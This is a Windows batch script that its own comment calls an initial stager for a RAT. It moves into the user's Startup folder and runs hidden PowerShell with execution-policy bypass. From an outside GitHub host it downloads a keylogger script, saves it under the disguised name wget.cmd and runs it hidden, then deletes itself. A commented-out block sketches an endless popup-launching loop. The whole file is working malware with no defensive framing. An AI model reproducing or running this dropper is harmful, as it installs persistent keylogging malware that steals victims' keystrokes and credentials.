@echo off

@rem initial stager for the rat

set InitialPath=%cd%
set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup

@rem go to startup
cd %StartupDir%

@rem Download payload
powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Duckey-Logger-Retried/refs/heads/main/logger.ps1' -outfile '.\wget.cmd'"

@rem run the payload
powershell -noprofile start-process powershell.exe -windowstyle hidden ".\wget.cmd"

@rem move back to saved directory
cd %InitialPath%

del initial.cmd

@REM (
@REM     echo @echo off
@REM     echo :loop
@REM     echo start /min cmd /c "popup.vbs"
@REM     echo goto loop
@REM )>payload.cmd

